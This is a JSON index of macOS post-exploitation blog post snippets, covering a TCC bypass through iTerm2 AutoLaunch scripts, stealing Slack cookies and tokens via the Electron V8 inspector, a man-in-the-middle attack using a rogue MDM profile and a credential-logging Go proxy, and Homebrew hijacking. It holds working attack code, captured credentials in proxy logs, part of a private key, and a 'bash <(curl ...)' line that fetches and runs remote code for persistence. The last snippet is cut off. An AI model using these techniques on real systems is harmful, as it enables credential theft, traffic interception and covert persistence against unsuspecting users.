[ { "title": "Bypassing TCC With iTerm2", "url": "/posts/Bypassing-TCC-With-iTerm2/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2021-12-08 00:00:00 +0800", "snippet": "MotivationWhen landing a shell in MacOS environments, you’ll frequently want access to the files under your victim’s home folder. Some of these locations are TCC protected. Specifically ~/Documents/, ~/Downloads/, ~/Desktop/ all require their own approvals which correspond to the kTCCServiceSystemPolicyDocumentsFolder, kTCCServiceSystemPolicyDownloadsFolder, kTCCServiceSystemPolicyDesktopFolder service categories respectively. Depending on how you landed your initial access, you may not have the necessary TCC approvals. If your target has iTerm2 installed and they use it for day-to-day work, you may have a simple way around these TCC restrictions.iTerm2 AutoLaunch ScriptsiTerm2 has support for autolaunching an AppleScript file at startup, if it’s placed at a predetermined path, as documented here. This technique was also discussed for persistence purposes by noncetonic in this post. Internally, this is done programmatically using NSUserAppleScriptTask.The VulnerabilityThis allows us to have iTerm2 send AppleEvents to itself (or other applications) to do things on our behalf. iTerm2 may not be approved to send AppleEvents to other applications, but an app can always send events to itself. So, anything iTerm2 is approved via TCC to do, we are also approved to do.We can craft an AutoLaunch.scpt that asks iTerm2 to exfiltrate the contents of protected directories like ~/Documents, ~/Downloads, and ~/Desktop when the user launches iTerm2 to a directory that we have full read access to.Simple Proof of ConceptWrite the following contents to ~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt.-- ~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpttell application &quot;iTerm&quot; do shell script &quot;cp -R ~/Documents/ /tmp/&quot;end tellCaveatsAn important note is that AutoLaunch.scpt is only executed when iTerm2 first starts up. If it’s already running on the target, you may have to be noisy and kill or hang the process, prompting the user to re-open it." }, { "title": "Looting Electron Apps Via The V8 Inspector", "url": "/posts/Looting-Electron-Apps-Via-V8-Inspector/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2021-08-29 00:00:00 +0800", "snippet": "What Is The V8 Inspector?V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a debugging interface that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the “tip-of-tree” or “stable” protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc. However, in Electron applications, we’re targeting the Node environment. This relegates us to a smaller subset of the CDP (v8-inspector (node)).How Is This Useful?Many Electron applications ship with the command-line option to enable the V8 Inspector at startup, binding it to a local port. We can then connect to this port and perform introspection and manipulation on the target application, extracting secrets along the way. We’ll use Slack as a case study in this post, extracting the AuthN token and cookie.Starting The InspectorTo launch the target with the V8 Inspector enabled, we can use the --inspect option. Many Electron applications have this enabled (e.g Ledger Live), just give it a shot on your favorites. In the below example, we’re launching Slack on MacOS.$ /Applications/Slack.app/Contents/MacOS/Slack --inspectDebugger listening on ws://127.0.0.1:9229/b84df45f-b494-4e18-b77c-d8ed8f34c44dFor help, see: https://nodejs.org/en/docs/inspectorInitializing local storage instance(node:82531) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.(Use `Slack --trace-deprecation ...` to show where the warning was created)[08/29/21, 19:12:21:841] info:╔══════════════════════════════════════════════════════╗║ Slack 4.18.0, darwin (Store) 20.6.0 on x64 ║╚══════════════════════════════════════════════════════╝Speaking The ProtocolLuckily for us, Golang bindings for the CDP are available. This should allow us to invoke methods on the target with fairly little code.While the full CDP exposes some gnarly stuff (see MangoPDF’s usage of Network.getAllCookies), the bulk of those methods are not exposed in the Node version. For example, if you attempt to invoke the Network.GetAllCookies method, you’ll get an RPC error: GetAllCookies: rpc error: &#39;Network.getAllCookies&#39; wasn&#39;t found (code = -32601)).However, the Runtime domain exposes something even more powerful, direct access to the JavaScript VM that’s running in the target. Using the Runtime.evaluate method (or the pair of Runtime.compileScript and Runtime.runScript), we can execute JavaScript snippets within the context of the Electron application. We can execute some JS snippets remotely with some short PoC code:func main() { scriptPath := flag.String(&quot;script&quot;, &quot;&quot;, &quot;Path to JS script to evaluate in the target&quot;) inspectTarget := flag.String(&quot;inspect-target&quot;, &quot;&quot;, &quot;V8 inspector listener&quot;) flag.Parse() if *inspectTarget == &quot;&quot; { log.Fatalf(&quot;Must specify inspector target&quot;) } if *scriptPath == &quot;&quot; { log.Fatalf(&quot;Must specify script payload&quot;) } scriptData, err := ioutil.ReadFile(*scriptPath) if err != nil { panic(err) } ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second) defer cancel() devt := devtool.New(*inspectTarget) pt, err := devt.Get(ctx, devtool.Node) if err != nil { panic(err) } conn, err := rpcc.DialContext(ctx, pt.WebSocketDebuggerURL) if err != nil { panic(err) } defer conn.Close() c := cdp.NewClient(conn) eval := runtime.NewEvaluateArgs(string(scriptData)) eval.AwaitPromise = BoolAddr(true) eval.ReplMode = BoolAddr(true) reply, err := c.Runtime.Evaluate(context.Background(), eval) if err != nil { panic(err) } if reply.ExceptionDetails != nil { // Dump the exception details if the script run was unsuccessful log.Fatalf(&quot;Exception(line %d, col %d): %v\\n&quot;, reply.ExceptionDetails.LineNumber, reply.ExceptionDetails.ColumnNumber, reply.ExceptionDetails.Exception) } // discarding the error result, failure doesn&#39;t matter. // This will just handle cases where string results come // back doubled escaped, causing parsing issues in follow-up // tools like `jq` s, _ := strconv.Unquote(string((*reply).Result.Value)) fmt.Printf(&quot;%s\\n&quot;, s)}For the full code with the example scripts, check out electron-probe.Building Something UsefulParticularly of interest are the Session API and the WebContents API.Let’s get a handle to the Electron runtime, so that we can access all the methods included in its API:electron = process.mainModule.require(&#39;electron&#39;);First up, using the Session API we can get access to the cookie storage of the current session(defaultSession):// dump_slack_cookies.jselectron = process.mainModule.require(&#39;electron&#39;);JSON.stringify((await electron.session.defaultSession.cookies.get({})))You may notice that we used JSON.stringify on the result. Getting values out of the V8 VM can be finicky, depending on the object type returned. I’m resorting to pulling out objects as strings of JSON for easy parsing. For more robust handling of different object types being returned, see Runtime.getProperties and Runtime.queryObjects.Running the result, it appears to work:$ ./electron-probe -inspect-target http://localhost:9229 -script scripts/dump_slack_cookies.js | jq [ [... SNIP] { &quot;name&quot;: &quot;ssb_instance_id&quot;, &quot;value&quot;: &quot;90d5538e- [ REDACTED ]&quot;, &quot;domain&quot;: &quot;.slack.com&quot;, &quot;hostOnly&quot;: false, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: false, &quot;httpOnly&quot;: false, &quot;session&quot;: false, &quot;expirationDate&quot;: 1945639889, &quot;sameSite&quot;: &quot;unspecified&quot; }, { &quot;name&quot;: &quot;d&quot;, &quot;value&quot;: &quot;aX9QnD8F [ REDACTED ]&quot;, &quot;domain&quot;: &quot;.slack.com&quot;, &quot;hostOnly&quot;: false, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: true, &quot;httpOnly&quot;: true, &quot;session&quot;: false, &quot;expirationDate&quot;: 1941391182.507454, &quot;sameSite&quot;: &quot;lax&quot; }, [...SNIP]]We’ve extracted the d cookie value from a running Slack instance. This is half of the material we need to steal a session.Next, let’s work on lifting out the user token that goes with that cookie. The token is submitted with every request in the request body, and begins with xoxc-. It should be accessible via the localConfig_v2 key in Local Storage:// dump_slack_tokens.js// Get a handle to the Electron APIselectron = process.mainModule.require(&#39;electron&#39;);// Get the first WebContents instance that we can access the associated Local Storagewindow = electron.webContents.getAllWebContents()[0];// We have to go one level deeper. Using javascript execution in Electron&#39;s V8 runtime, we// will in turn trigger javascript execution in the target window.// Look, I&#39;m not proud of it either. let config_blob = await window.executeJavaScript(&#39;localStorage.localConfig_v2&#39;);// Shave off the cruft and make a nice object to stringify that just contains the // workspace name and the associated token.let config_obj = JSON.parse(config_blob);let teams = Object.values(config_obj.teams)let extracted_teams = [];teams.forEach(e =&amp;gt; { extracted_teams.push({ &#39;name&#39;: e.name, &#39;token&#39;: e.token })});JSON.stringify(extracted_teams)Let’s see what we got:$ ./electron-probe -inspect-target http://localhost:9229 -script scripts/dump_slack_tokens.js | jq[ { &quot;name&quot;: &quot;r2c&quot;, &quot;token&quot;: &quot;xoxc-65630S1[ REDACTED ]&quot; }, { &quot;name&quot;: &quot;Binary Ninja Public Chat&quot;, &quot;token&quot;: &quot;xoxc-1300035[ REDACTED ]&quot; }, [ SNIP ]]Using The CredentialsNow we have both the d cookie as well as the xoxc token required to authenticate as our target user. We can use these credentials together to access the Slack API as the target user. For example, we can use Slarf to dump the user directory for a workspace:$ ./slarf -cookie aX9QnD8F[REDACT] -token xoxc-1300035[REDACT] | jq &#39;.[].name&#39;&quot;slackbot&quot;&quot;actae0n&quot;[ SNIP ]Rapid JS Payload PrototypingIf you want a nicer environment to develop your JS payloads in, I’d recommend using the Chrome/Chromium/Brave DevTools to talk to the Inspector. Once the target application has been launched with the Inspector listening, you can attach to it by navigating to chrome://inspect.In the Remote Target (localhost) section, you should see your target listed. You can click the inspect button to open DevTools for your target.Additional IdeasSince you have direct access to the WebContents object, you could rewrite the DOM or redirect at will (e.g embedding a credential capture page) by loading content with WebContents.loadURL(). Check out the inline_content.js and redirect.js scripts for examples of this.Electron also has some support (albeit unsafe) for loading Node extensions at runtime using process.dlopen(), however I didn’t explore this. Using Slack as a host for your implant would be nice though!" }, { "title": "Hijacking Web Traffic On MacOS and iOS With MDM Profiles", "url": "/posts/Hijacking-Web-Traffic-MDM-Profiles/", "categories": "", "tags": "MacOS", "date": "2019-12-18 00:00:00 +0800", "snippet": "What Are MDM Profiles?MDM profiles allow organizations to deploy common device configurations across MacOS and iOS devices. They can be deployed by hand, or via 3rd party MDM solutions such as Jamf or Munki. They’re deployed as .mobileconfig files, which are just XML under the hood. Here’s an example config that enforces a wallpaper setting:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;&amp;lt;plist version=&quot;1.0&quot;&amp;gt;&amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;HasRemovalPasscode&amp;lt;/key&amp;gt; &amp;lt;false/&amp;gt; &amp;lt;key&amp;gt;PayloadContent&amp;lt;/key&amp;gt; &amp;lt;array&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;PayloadDisplayName&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;Desktop Picture&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadIdentifier&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;com.apple.desktop&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadType&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;com.apple.desktop&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadUUID&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;C68C5CBC-A9AD-44F5-8C49-22E78A5D5370&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadVersion&amp;lt;/key&amp;gt; &amp;lt;integer&amp;gt;1&amp;lt;/integer&amp;gt; &amp;lt;key&amp;gt;locked&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; &amp;lt;key&amp;gt;override-picture-path&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;/usr/local/wallpaper_hax.png&amp;lt;/string&amp;gt; &amp;lt;/dict&amp;gt; &amp;lt;/array&amp;gt; &amp;lt;key&amp;gt;PayloadIdentifier&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;test.B3664B4A-54C5-4B27-B5C7-30BF3EAD1F29&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadRemovalDisallowed&amp;lt;/key&amp;gt; &amp;lt;false/&amp;gt; &amp;lt;key&amp;gt;PayloadType&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;Configuration&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadUUID&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;5ED6ABEF-27E5-4724-BAFB-D5C43761D446&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;PayloadVersion&amp;lt;/key&amp;gt; &amp;lt;integer&amp;gt;1&amp;lt;/integer&amp;gt;&amp;lt;/dict&amp;gt;&amp;lt;/plist&amp;gt;So What?A user can click on a .mobileconfig file to launch an installation wizard which will apply the attacker-controlled configuration settings to their device. Interestingly, they’re not currently restricted by Gatekeeper in anyway. At the time of writing, there are no signing or notarization requirements for MDM profiles (to my knowledge). However, there is an interesting UI/UX quirk that works in favor of attackers to increase the odds of a successful installation if you do choose to sign.What’s The Plan?Let’s build an MDM profile that sets a system wide HTTP proxy so that we can read their web traffic. Additionally, let’s add our own rogue CA certificate to their Keychain, which will be trusted system wide. This will allow us to intercept HTTPS traffic without their browser throwing nasty errors. Our proxy should dump their requests for inspection, so that we can loot session cookies and credentials from it.Constructing The Proxy ServerThere’s a great Go library called goproxy that makes it trivial to create custom proxy applications. Let’s modify one of the examples to dump requests that pass through the proxy. This will let us inspect the victim’s cookies and POST data (which will include credentials for login endpoints). There’s a lot of capability that can be built out here to make harvesting loot easier. Write regexes for POSTs to particular domains:uri pairs to pull out passwords. Log cookies to a database and send yourself a notification when a new session is detected for a domain you’re interested in, etc. But for the sake of example, let’s keep it simple.package mainimport ( &quot;crypto/tls&quot; &quot;crypto/x509&quot; &quot;flag&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; &quot;fmt&quot; &quot;github.com/elazarl/goproxy&quot; &quot;net/http/httputil&quot;)func setCA(caCert, caKey []byte) error { goproxyCa, err := tls.X509KeyPair(caCert, caKey) if err != nil { return err } if goproxyCa.Leaf, err = x509.ParseCertificate(goproxyCa.Certificate[0]); err != nil { return err } goproxy.GoproxyCa = goproxyCa goproxy.OkConnect = &amp;amp;goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: goproxy.TLSConfigFromCA(&amp;amp;goproxyCa)} goproxy.MitmConnect = &amp;amp;goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: goproxy.TLSConfigFromCA(&amp;amp;goproxyCa)} goproxy.HTTPMitmConnect = &amp;amp;goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: goproxy.TLSConfigFromCA(&amp;amp;goproxyCa)} goproxy.RejectConnect = &amp;amp;goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: goproxy.TLSConfigFromCA(&amp;amp;goproxyCa)} return nil}func main() { verbose := flag.Bool(&quot;v&quot;, false, &quot;should every proxy request be logged to stdout&quot;) addr := flag.String(&quot;addr&quot;, &quot;:443&quot;, &quot;proxy listen address&quot;) certPath := flag.String(&quot;cert&quot;, &quot;cert.crt&quot;, &quot;Path to CA certificate&quot;) keyPath := flag.String(&quot;key&quot;, &quot;key.pem&quot;, &quot;Path to CA key&quot;) flag.Parse() certData, err := ioutil.ReadFile(*certPath) if err != nil { log.Fatalf(&quot;Couldn&#39;t read certificate: %v\\n&quot;, err) } keyData, err := ioutil.ReadFile(*keyPath) if err != nil { log.Fatalf(&quot;Couldn&#39;t read key: %v\\n&quot;, err) } setCA(certData, keyData) proxy := goproxy.NewProxyHttpServer() proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm) proxy.Verbose = *verbose proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) { requestData, err := httputil.DumpRequest(req, true) if err != nil { fmt.Printf(&quot;Failed to dump request: %v\\n&quot;, err) } fmt.Println(string(requestData)) return req, nil }) log.Fatal(http.ListenAndServe(*addr, proxy))}Deploying The Proxy ServerInfrastructure-wise, I’m just going to throw the proxy setup into an ec2 instance in AWS. I’ll point a domain (0day.gg) at it, and assign a security group allowing port 443 inbound. Our proxy will need a CA certificate to use. Let’s generate one real quick. There’s a utility called certstrap by Square that I like to use in place of the OpenSSL cli that simplifies the process of generating certificates, certificate signing requests, etc.ubuntu@ip-172-31-23-174:~$ go versiongo version go1.13.5 linux/amd64ubuntu@ip-172-31-23-174:~$ go install github.com/square/certstrapgo: finding github.com/square/certstrap v1.2.0go: downloading github.com/square/certstrap v1.2.0go: extracting github.com/square/certstrap v1.2.0go: downloading github.com/urfave/cli v1.21.0go: downloading github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2cgo: extracting github.com/urfave/cli v1.21.0go: extracting github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2cgo: downloading golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85go: extracting golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85go: downloading golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35go: extracting golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35go: finding github.com/urfave/cli v1.21.0go: finding github.com/howeyc/gopass v0.0.0-20170109162249-bf9dde6d0d2cgo: finding golang.org/x/crypto v0.0.0-20181127143415-eb0de9b17e85go: finding golang.org/x/sys v0.0.0-20181128092732-4ed8d59d0b35ubuntu@ip-172-31-23-174:~$ certstrap init --common-name &quot;Acme Corp&quot;Enter passphrase (empty for no passphrase):Enter same passphrase again:Created out/Acme_Corp.keyCreated out/Acme_Corp.crtCreated out/Acme_Corp.crlubuntu@ip-172-31-23-174:~$ head out/Acme_Corp.key out/Acme_Corp.crt==&amp;gt; out/Acme_Corp.key &amp;lt;==-----BEGIN RSA PRIVATE KEY-----MIIJJwIBAAKCAgEAtZdDShW/w7jlYKOaVA8PWg+ax94LVq86vXQj0YIT8DvlNLwr9V0EWhLnPVCNAOPp077t+k8zlhybOfLaT8S9byzWGN8VH3IU79J6mzonvjIIyX14uy5dZRL488bExVokg23DREoIJfMAtsPzGgs1xyhym8qZe70YSMrSUMS5RB8oSS8egId5M27mhmCCaDn2KN6FJD+LjJJZL/7lsbGHWlE9+HdcRQ1L//elvROeXm5MuAOmaFU3GWKqkGhIGD09sDmJQoUc6v2ABWSVJ6nnhSrUPlHUvmnyJeSZHVZtTA5kV7sbeCHTgUk1tE2GgdF9yLb6ddiENAitTlE5pxC9n+LmxiPZIr1f+8dqsjc9H7dReTsV8hNlP7jOQ6ur3Nw1q0C9ktCrEwoN75GM7O6Ve+1vJXMWeld8pkyyOeKG+NP+ULRUuLi20QR3COZXrjYKLEQIKM7oaOBIkTVwJni4xxKZw6h8GhuGD9mltV+DPMnr/DcWAx5kCeAQy1ovK7qU0kbtF23bQ2LE++iQpDzKAu9TAWCaIy2ZlTxhBVgsAEQW4gto==&amp;gt; out/Acme_Corp.crt &amp;lt;==-----BEGIN CERTIFICATE-----MIIE6DCCAtCgAwIBAgIBATANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDEwlBY21lIENvcnAwHhcNMTkxMjE5MDQzNDU2WhcNMjEwNjE5MDQzNDUyWjAUMRIwEAYDVQQDEwlBY21lIENvcnAwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC1l0NKFb/DuOVgo5pUDw9aD5rH3gtWrzq9dCPRghPwO+U0vCv1XQRaEuc9UI0A4+nTvu36TzOWHJs58tpPxL1vLNYY3xUfchTv0nqbOie+MgjJfXi7Ll1lEvjzxsTFWiSDbcNESggl8wC2w/MaCzXHKHKbypl7vRhIytJQxLlEHyhJLx6Ah3kzbuaGYIJoOfYo3oUkP4uMklkv/uWxsYdaUT34d1xFDUv/96W9E55ebky4A6ZoVTcZYqqQaEgYPT2wOYlChRzq/YAFZJUnqeeFKtQ+UdS+afIl5JkdVm1MDmRXuxt4IdOBSTW0TYaB0X3Itvp12IQ0CK1OUTmnEL2f4ubGI9kivV/7x2qyNz0ft1F5OxXyE2U/uM5Dq6vc3DWrQL2SLet’s kick off the proxy server so it’s ready. If you’re lazy and just want to clone the super basic proxy server code, it’s located here. I’m just going to throw this into an ec2 instance in AWS.ubuntu@ip-172-31-23-174:~$ cd procksy/ubuntu@ip-172-31-23-174:~/procksy$ lsgo.mod go.sum main.goubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.keyAlright, now the proxy is listening and ready to capture web traffic. Let’s move on to the next step, setting up our malicious profile.Building The ProfileFor simplicity, I’m going to use Apple’s Configurator 2 to generate the profile. An alternative is iMazing Profile Editor. There’s plenty of graphical profile editor utilities, which one you use is up to you. When you open Configurator, you’ll be presented a screen that looks like the following:Click File -&amp;gt; New Profile and you’ll come to the profile editor window. The first tab, General, lets us set up a name (the profile title), a unique identifier, an organizational identifier, a description to display to the user during installation. Use these fields to tailor the install experience to your phishing pretext.An important feature to note on this page is the support for automatic removal. You can set the profile to expire after a specified duration, or on a specified date. When the expiry criteria is met, the profile will be automatically uninstalled, and any settings it changed will be reverted. This includes removing your installed certificate from the Keychain.Next, let’s set up the Proxy configuration. You’ll need to set the hostname and port. You can optionally configure a username and password to authenticate to the proxy with, if your setup supports it.In order to proxy HTTPS traffic without generating trust errors, we’ll need their system to trust our CA. Let’s add our rogue CA certificate to their Keychain. When you click Configure, you’ll be given a file selection dialogue to choose a cert file. After you choose your CA certificate, you’ll see the following image. Don’t worry about the This root certificate is not trusted warning. It will be trusted once installed by the profile.The last step is to (optionally) sign our profile. Go to File -&amp;gt; Sign Profile. A dropdown dialogue will appear listing the code signing identities stored in your Keychain. There are benefits and caveats to weigh when signing your profile. One significant benefit is that the user will see a green Verified indicator in the expanded installation window next to the org name, which may increase the likelihood of them installing the profile. Note that there aren’t any profile signing or notarization requirements by default, so signing is (currently) entirely optional. Gatekeeper won’t try to stop you. For the sake of demonstration, I’ll sign this profile with my developer certificate. Finally, let’s save the profile and get ready to send it to the victim. Go to File -&amp;gt; Save and select a storage location.Now, let’s try to install our profile to see what the installation experience is like for the victim. When I open my MDM profile, I’m presented with the first installation pane:If I click the Show Profile button, the pane will expand to display the profile details. Note the nice looking green Verified indicator that ends up right next to our company name. Legitimate looking. Very soothing. Reminds me of home. The victim will likely not understand that the Verified indicator simply means the profile has been signed, and that it may not legitimately be from the organization that is show next to it in that dialog.I’ve redacted my Developer ID and name from the dialogue, but note that those will show up if you choose to sign your profile. Below that, the user can see the configuration details. You should count on the user wanting to click Show Profile, so choose a domain that fits the pretext. You can imagine 0day.gg isn’t the best choice, but it works for this demo. Something like proxy.target-org-lookalike.tld could be a good choice.After clicking continue, the user will hit one last pane (with an optional expansion button):Upon clicking Install, the user will be asked for either their password or fingerprint, depending on if TouchID is configured or not. After supplying credentials or using the fingerprint sensor, the profile is installed.Testing The SetupLet’s hit Google and see if our setup is working. There should be no certificate errors.And if we pop over to our proxy, we should see the request in STDOUT:ubuntu@ip-172-31-23-174:~/procksy$ sudo ./procksy -cert ../out/Acme_Corp.crt -key ../out/Acme_Corp.key[SNIP]GET http://www.google.com/ HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.5Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0Let’s simulate the victim signing in to their company SSO portal.And the corresponding request in the proxy log:POST / HTTP/1.1Host: [SNIP].okta.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.5Connection: keep-aliveContent-Length: 39Content-Type: application/x-www-form-urlencodedCookie: __cfduid=de55169fca8d355f6b947f59708f984db1576815061; _okta_attribution={\\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_session_attribution={\\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}; _okta_original_attribution={\\%22utm_page%22:%22/%22%2C%22utm_date%22:%2212/19/2019%22}Origin: https://[SNIP].okta.comReferer: https://[SNIP].okta.com/Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0username=snacksun&amp;amp;password=slackersclubOnce the user has completed their login process and hit the landing page, we will have recorded both their credentials (username:password pair) as well as cookies for their active session. Having access to the cookies can be especially useful when attacking SSO portal that are protected with 2FA, as a user:password pair won’t cut it for access. By using their user:password, you also risk triggering protections that alert on logins from a new location. Import the cookies into your own browser using an extension such as Editthiscookie, and have fun looting with their session.It’s useful to note that our proxy settings will be inherited by apps that respect the system HTTP proxy settings. So you’re not limited to capturing/manipulating only browser-generated traffic.Bonus RoundOur proxy controls both the request (before hitting the destination server) and the response (before being returned to the client), so we can freely manipulate traffic. Some attacks to consider might be injecting JS hooks using something like Beef for client side phishing attacks and potential internal network access via XHR, and code injection in downloaded applications and scripts. Maybe you add a line to install scripts that the user downloads, or intercept packages, add files and manipulate scripts, resign, then forward it back to the requesting client. You’re the middleman.Does This Work For iOS Devices?It does, with some limitations. This payload can only be installed on an iOS device that is in supervised mode. If the organization you’re targeting issues corporate phones, they’re likely centrally managed somehow, so the devices will probably be in supervised mode. In that case, you can send the MDM profile to the victim and have them open it in either Safari or the Mail app, and they will be walked through similar installation steps. The major difference in installation experience is that after downloading the profile, the user will be directed to manually go to the Profiles section in the Settings app to finish the installation.Wrapping UpMDM profiles have some interesting applications for attackers. There’s a lot of attack surface to be explored here yet, and Apple hasn’t yet introduced signing and verification requirements for profiles. We’ve seen that the HTTP proxy payload is very powerful in SSO+SaaS based environments. If you liked this post, you might find @1njection’s MDM post interesting as well. If you’d like to explore all of the official keys/payloads for profiles, you should check out Apple’s reference." }, { "title": "HomeBrood 0x00 - Surreptitious hijacking of Homebrew on macOS", "url": "/posts/Surreptitious-hijacking-brew-macOS/", "categories": "", "tags": "MacOS, Persistence", "date": "2019-04-05 00:00:00 +0800", "snippet": "ForewardI thought it might be fun to poke at Homebrew and see what kind of things I could find. Welcome to the beginning of what I hope will be a small but fun series of posts on abusing HomeBrew.HomeBrood 0x00Homebrew AnalyticsBy default, homebrew is set to phone home to Google Analytics over HTTPS and provide a number of known, documented, metadata strings claimed by the Homebrew team to help maintainers and as such “leaving it on is appreciated”.The more paranoid-inclined user seeking to cut down on the data they freely hand over to Google and other analytic companies may already know to disable analytics right after installing homebrew and before going off and installing packages. Unfortunately, as will be shown homebrew analytics can be far more dangerous than it would appear.Check out https://github.com/Homebrew/brew/blob/master/docs/Analytics.md to read more about the information gathered by Homebrew Analytics and how to disable this feature or just run brew analytics off to disable Homebrew Analytics if brew analytics does not return “Analytics is disabled.”AnalytricksReading through /usr/local/Homebrew/Library/Homebrew/brew.sh reveals an interesting opportunity for a number of possible scenarios for attacks but a basic example of persistence will be provided here to keep with the context of this file.# Don&#39;t need shellcheck to follow this `source`.# shellcheck disable=SC1090source &quot;$HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh&quot;setup-analytics From /usr/local/Homebrew/Library/Homebrew/brew.shFirst and foremost the $HOMEBREW_LIBRARY/Homebrew/utils/analytics.sh file (full, expanded path /usr/local/Homebrew/Library/Homebrew/utils/analytics.sh) is sourced blindly without attempting to ensure the file even exists and then proceeds to run the newly exported setup-analytics function donated by analytics.sh. This means that even when Homebrew Analytics has been explicitly disabled on a system it is not until after all code within analytics.sh is run that Homebrew checks whether or not analytics should be sent.It’s simple to see how easily the user-owned, user-writeable analytics.sh file can be abused by simply adding commands to the end of the analytics.sh file or within the setup-analytics function, hell you’re free to write your own bash script altogether and including an empty setup-analytics function to keep from causing an error. This all happens pretty early on in the logic for subcommands of the brew command; shortly after determining the subcommand and well before processing package names and subcommand options are slurped in for processing. This makes it possible to pass a malicious package name during a brew install command in addition to running just about anything you want.Let’s explore some of these attacks and their implementation.Hijacking brew installAdd the following tiny modification at the bottom of the analytics.sh file# Prepend a defined package to all invocations of `brew install`if [[ &quot;$HOMEBREW_COMMAND&quot; = &quot;install&quot; ]]then set &quot;YOUR_DESIRED_PACKAGE_HERE&quot; &quot;$@&quot;fiNice and easy. As the analytics.sh file is sourced into brew.sh we are lucky enough to have access to the $HOMEBREW_COMMAND variable which holds the subcommand sent to the brew command as well as $@ which contains the arguments passed to the subcommand.Presumably the possibly most esoteric bit of code here for beginner BASH scripters is the line starting with set.The set command allows rearranging the order of the arguments passed on the commandline and in this example simply prepends whichever package you choose to the list of arguments the user provided which ensures our desired package is installed first and can hopefully get lost in the wall of text generated during a brew install.This same concept can be applied to run any commands you want, you are not limited to simply brew commands. For example if you’d just like to have a compromised host send a request to a server wehenever brew is run as a way of gaining access to the network in case of being forcefully ejected from the network or just because networks are hard a simple script could be written which sends a GET request to a remotely hosted file and executing any commands within that file.bash &amp;lt;(curl -s https://gist.githubusercontent.com/n0ncetonic/1d965369574a413b4dd1e4514e27992a/raw/675a9546c6ecdb46ce5a6b13a7faf63428359e53/example.sh)Adding this simple one-liner into analytics.sh will cause the contents of the remote file to be run whenever brew is run.ClosingThese PoCs are intended to be used as demos in aiding teams attempting to write detections around TTPs which could be leveraged by threat actors to avoid triggering common persistence detection checks . The potential for far more complex payloads which take advantage of this Technique are the responsibility of the reader to create.If you do happen to come up with something fun that takes advantage of this simple brew command hijack please let me know via twitter @noncetonic" }, { "title": "Acquiring and Abusing Slack Legacy Tokens on macOS", "url": "/posts/acquiring-and-abusing-legacy-slack-tokens/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2019-03-18 00:00:00 +0800", "snippet": "ForewardRight on the tails of my last post that detailed a token theft attack on macOS, today I’m sharing yet another procedure for acquiring and abusing tokens found on a macOS system.Included with this post are two github projects, one which helps extract the tokens from Slack, and another which leverage the tokens for incognito logging and monitoring of a Slack team.Legacy TokensSo what exactly are “Legacy 